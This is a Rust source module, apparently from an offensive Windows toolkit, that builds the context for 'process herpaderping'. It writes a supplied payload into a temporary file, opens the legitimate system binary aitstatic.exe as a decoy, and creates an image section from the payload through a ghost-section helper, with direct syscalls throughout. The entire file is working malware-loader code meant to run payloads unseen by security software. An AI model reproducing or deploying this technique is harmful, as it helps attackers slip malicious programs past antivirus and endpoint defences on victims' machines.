use windows_sys::Win32::{
    Foundation::INVALID_HANDLE_VALUE,
    Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
        OPEN_EXISTING,
    },
    System::SystemServices::{GENERIC_READ, GENERIC_WRITE},
};

use super::overwrite_tmp_file::overwrite_tmp_file;
use crate::{
    log, syscall,
    techniques::{
        pe::process_ghosting::{ghost_section::create_ghost_section, temp_file::create_temp_file},
        process_utils::get_cmdline,
    },
};

pub struct HerpaderpContext {
    pub tmp_pe: isize,
    pub legit_pe: isize,
    pub section_handle: usize,
    pub tmp_file_name_utf16: Vec<u16>,
    pub tmp_file_path_utf16: Vec<u16>,
}

pub unsafe fn create_tmp_path_and_cmdline() -> (Vec<u16>, Vec<u16>) {
    unsafe {
        let tmp_file_name = create_temp_file(false);

        log!("Created tmp path: {:?}", tmp_file_name);

        // Build tmp_file_path_utf16 = tmp_file_name + arguments
        let mut tmp_file_path_utf16: Vec<u16> = tmp_file_name
            .iter()
            .cloned()
            .take_while(|&c| c != 0)
            .collect();

        tmp_file_path_utf16.extend(get_cmdline().encode_utf16());
        tmp_file_path_utf16.push(0);

        // Return both
        (
            tmp_file_name
                .iter()
                .cloned()
                .take_while(|&c| c != 0)
                .collect(),
            tmp_file_path_utf16,
        )
    }
}

pub unsafe fn fix_tmp_file_name(mut tmp_file_name_utf16: Vec<u16>) -> Vec<u16> {
    if let Some(pos) = tmp_file_name_utf16
        .windows(4)
        .position(|w| w == [b'.' as u16, b't' as u16, b'm' as u16, b'p' as u16])
    {
        tmp_file_name_utf16.truncate(pos + 4);
        tmp_file_name_utf16.push(0);
    }
    tmp_file_name_utf16
}

pub unsafe fn open_file(file_path: *const u16, access: u32) -> isize {
    unsafe {
        let handle = CreateFileW(
            file_path,
            access,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            core::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );

        if handle == INVALID_HANDLE_VALUE {
            log!("CreateFileW failed.");
        }

        handle
    }
}

pub unsafe fn prepare_herpaderp_context(payload: &[u8]) -> Option<HerpaderpContext> {
    unsafe {
        let (tmp_file_name_utf16, tmp_file_path_utf16) = create_tmp_path_and_cmdline();
        if tmp_file_name_utf16.is_empty() {
            return None;
        }

        let fixed_tmp_file_name_utf16 = fix_tmp_file_name(tmp_file_name_utf16.clone());

        let tmp_pe = open_file(
            fixed_tmp_file_name_utf16.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
        );
        if tmp_pe == INVALID_HANDLE_VALUE {
            return None;
        }

        let legit_pe = open_file(
            windows_sys::w!("C:\\Windows\\System32\\aitstatic.exe"),
            GENERIC_READ,
        );
        if legit_pe == INVALID_HANDLE_VALUE {
            syscall!("NtClose", tmp_pe);
            return None;
        }

        if !overwrite_tmp_file(
            None,
            Some(payload.as_ptr()),
            Some(payload.len() as u32),
            tmp_pe,
            false,
        ) {
            log!("overwrite_tmp_file with payload failed.");
            syscall!("NtClose", legit_pe);
            syscall!("NtClose", tmp_pe);
            return None;
        }

        log!("Wrote the payload file to the created temporary file.");

        let section_handle = match create_ghost_section(tmp_pe, false) {
            Some(h) => {
                log!("Created a section handle.");
                h
            }
            None => {
                log!("Failed to create ghost section.");
                syscall!("NtClose", legit_pe);
                syscall!("NtClose", tmp_pe);
                return None;
            }
        };

        Some(HerpaderpContext {
            tmp_pe,
            legit_pe,
            section_handle,
            tmp_file_name_utf16,
            tmp_file_path_utf16,
        })
    }
}
